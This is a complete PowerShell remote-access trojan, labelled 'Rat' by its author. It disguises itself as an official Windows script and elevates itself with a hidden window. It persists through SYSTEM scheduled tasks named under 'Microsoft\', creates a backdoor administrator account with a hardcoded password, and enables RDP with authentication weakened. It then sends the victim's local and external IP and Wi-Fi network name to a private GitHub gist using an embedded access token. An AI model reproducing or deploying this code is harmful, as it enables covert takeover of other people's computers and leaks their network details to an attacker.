param (
    [string]$run
)
####################################################################################################
# Authors: github.com/NetConnectors
# Description: Rat
####################################################################################################

#Check if the script is running with params
if ($run -ne "o" -and $run -ne "init" -and $run -ne "disable") {
    Write-Host "###############################################"
    Write-Host "# This is an official Windows Script          #"
    Write-Host "# DO NOT REMOVE/MODIFY THIS FILE!             #"
    Write-Host "# DO NOT MODIFY THIS FILE!                    #"
    Write-Host "###############################################"
    Exit
}


function Startup {
    # Make sure the script is running as an administrator
    if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
        Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs -WindowStyle Hidden
        Exit
    }

    # Check if the script is running in a Windows environment
    if ($env:OS -ne "Windows_NT") {
        Write-Host "Not Supported"
        Exit
    }
}

function init {
    schtasks /create /sc HOURLY /tn "Microsoft\Rat" /tr "powershell $PSCommandPath -run o" /ru "SYSTEM" /f | out-null
    schtasks /create /sc ONLOGON /tn "Microsoft\RatLogon" /tr "powershell $PSCommandPath -run o" /ru "SYSTEM" /f | out-null
}

function Enable-RemoteDesktop {
    # Create new User
    $username = "RemoteUser"
    $password = "Remote123"
    $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
    # check if user already exists
    if (-not (Get-LocalUser -Name $username -ErrorAction SilentlyContinue)) {
        New-LocalUser -Name $username -Password $securePassword -FullName "Remote Desktop User" -Description "User for Remote Desktop" -AccountNeverExpires
        Add-LocalGroupMember -Group "Administrators" -Member $username
    }
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "UserAuthentication" -Value 0
    Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
    Restart-Service -Name TermService -Force | Out-Null
    # allow incoming 3389 port
    New-NetFirewallRule -DisplayName "Allow RDP" -Direction Inbound -LocalPort 3389 -Protocol TCP -Action Allow
}

function Disable-RemoteDesktop {
    Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 1
    Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "UserAuthentication" -Value 1
    Restart-Service -Name TermService -Force
    try {
        Disable-NetFirewallRule -DisplayGroup "Remote Desktop"
        Remove-NetFirewallRule -DisplayName "Allow RDP" -ErrorAction Stop
        Remove-LocalUser -Name "RemoteUser" -ErrorAction Stop
    } catch {
        Write-Output "User not found"
    }
}

function Create-Gist {
    param (
        [string]$Token
    )

    # Get IP address, port, and network name
    $localIp = (Get-NetIPAddress | Where-Object { $_.InterfaceAlias -eq "WiFi" }).IPAddress
    $externIp = (Invoke-RestMethod -Uri "https://api.ipify.org")
    $port = 3389
    $networkName = (netsh wlan show interfaces | Select-String SSID).Line.Split(':')[1].Trim()
    $networkName = $networkName -replace " ", "_"

    # Create Gist content
    $gistContent = @{
        description = "RDP"
        public = $false
        files = @{
            "rdp" = @{
                content = "localIP: $localIp`nexternal IP: $externIp`nPort: $port`nNetwork Name: $networkName"
            }
        }
    } | ConvertTo-Json

    # Create Gist via GitHub API
    $response = Invoke-RestMethod -Uri "https://api.github.com/gists" -Method Post -Headers @{
        Authorization = "token $Token"
        "User-Agent" = "PowerShell"
    } -Body $gistContent

    Write-Output "Gist created: $($response.html_url)"
}

function exec {
    Enable-RemoteDesktop
    $Token = "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"
    Create-Gist -Token $Token
}

function main {
    $ProgressPreference = 'SilentlyContinue'
    Startup
    if ($run -eq "init") {
        init
        Enable-RemoteDesktop
        exec
    } 
    if ($run -eq "o") {
        exec
    }
    if ($run -eq "disable") {
        Disable-RemoteDesktop
    }

    $ProgressPreference = 'Continue'
    Exit
}

main
